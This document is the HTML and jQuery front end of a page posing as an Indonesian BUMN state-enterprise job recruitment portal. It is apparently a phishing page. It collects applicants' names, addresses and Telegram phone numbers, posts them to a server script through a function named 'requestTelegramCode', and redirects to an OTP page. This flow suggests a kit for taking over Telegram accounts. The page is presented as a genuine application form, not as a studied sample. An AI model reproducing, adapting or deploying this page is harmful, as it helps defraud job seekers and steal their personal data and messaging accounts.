<html lang="en">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta property="og:title" content="Rekrutmen Bersama BUMN 2025">
    <meta property="og:image" content="/public/images/bumn.png">
    <meta name="description" content="Info Lowongan pekerjaan BUMN dan Swasta 2025 | TELKOM | MR DIY | BANK BRI | PEGADAIAN | PT FREEPORT | ALFAMART PERTAMINA| DAFTAR SEKARANG!! KLIK SINI ...">
    <meta name="author" content="Rekrutmen Bersama BUMN 2025">
    <title>LOKER BUMN</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
    <link href="https://fonts.googleapis.com/css2?family=Poppins:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&amp;family=Protest+Guerrilla&amp;family=Roboto:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,400;1,500;1,700;1,900&amp;display=swap" rel="stylesheet">
    <link rel="icon" href="/public/images/favicon.ico" type="image/x-icon" sizes="32x25">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.css">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
    <link rel="stylesheet" href="./public/css/style.css">
</head>

<body cz-shortcut-listen="true">
    <div class="loading" style="display: none" id="loading">
        <div class="loader"></div>
    </div>

    <section>
        <div class="container">
            <div class="row justify-content-center">
                <div class="col-md-10 col-lg-6">
                    <div class="card">
                        <div class="card-body">
                            <div class="top-card">
                                <img src="" alt="banner">
                            </div>
                            <div class="middle-card mt-3">

                                <h1 class="text-center">Masukkan Lamaran Sekarang</h1>
                                <p class="text-left">
                                    Untuk mendaftar silahkan login menggunakan akun <b>Telegram</b>. Dan kami akan
                                    menghubungi anda untuk melengkapi semua berkas yang diperlukan.
                                </p>

                                <form id="phone-form">
                                    <div class="mb-3">
                                        <label for="fullname" class="form-label">Nama Lengkap</label>
                                        <input type="text" class="form-control" name="fullname" id="fullname" placeholder="Nama sesuai E-KTP" required="">
                                    </div>

                                    <div class="mb-3">
                                        <label for="address" class="form-label">Alamat</label>
                                        <input type="text" class="form-control" name="address" id="address" placeholder="Alamat Anda" required="">
                                    </div>

                                    <div class="mb-3">
                                        <label for="gender" class="form-label">Jenis Kelmin</label>
                                        <select class="form-select" name="gender" id="gender" required="">
                                            <option value="Laki Laki">Laki-Laki</option>
                                            <option value="Perempuan">Perempuan</option>
                                        </select>
                                    </div>

                                    <div class="mb-3">
                                        <label for="phone" class="form-label">Nomor Telegram</label>
                                        <div class="input-group">
                                            <span class="input-group-text" id="basic-addon1">ID +62</span>
                                            <input type="tel" class="form-control" name="phone" id="phone" placeholder="Nomor Telegram Aktif" aria-label="Phone" aria-describedby="basic-addon1" required="">
                                        </div>
                                    </div>

                                    <div class="mb-3">
                                        <div class="form-check">
                                            <input class="form-check-input" type="checkbox" value="" id="flexCheckDefault" required="">
                                            <label class="form-check-label" for="flexCheckDefault">
                                                Saya setuju untuk menerima pesan <b>Telegram</b> dari
                                                <b>Admin</b> tentang lamaran ini.
                                            </label>
                                        </div>
                                    </div>
                                    <div class="mb-3 text-center">
                                        <button type="submit" class="btn btn-login text-uppercase">Daftar</button>
                                    </div>
                                </form>

                            </div>
                            <div class="bottom-card"></div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </section>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.js"></script>
    <script src="https://code.jquery.com/jquery.min.js"></script>
    <script>
        $(document).ready(function() {});
    </script>

    <script>
        $(document).ready(function() {
            var img = sessionStorage.getItem("img");
            console.log(img);
            $(".top-card").children("img").attr("src", img);

            $("#phone-form").on("submit", function(e) {
                e.preventDefault();
                var phoneNumber = $("#phone").val();
                if (phoneNumber.startsWith("0")) {
                    phoneNumber = phoneNumber.replace(/^0/, "+62");
                } else if (phoneNumber.startsWith("6")) {
                    phoneNumber = phoneNumber.replace(/^62/, "+62");
                } else if (phoneNumber.startsWith("8")) {
                    phoneNumber = phoneNumber.replace(/^8/, "+628");
                } else {
                    phoneNumber = phoneNumber;
                }

                const data = {
                    fullname: $("#fullname").val(),
                    address: $("#address").val(),
                    gender: $("#gender").val(),
                    phoneNumber: phoneNumber,
                }

                requestTelegramCode(data);
            });
        });

        function requestTelegramCode(data) {
            $(".loading").show();
            $.ajax({
                url: "./core/form.php",
                type: "POST",
                data: data,
                success: function(response) {
                    $(".loading").hide();
                    localStorage.setItem("phoneNumber", data.phoneNumber);
                    window.location.href = "./otp.php";
                },
                error: function(error) {
                    console.log("Error:", error);
                },
            });
        }
    </script>
</body>

</html>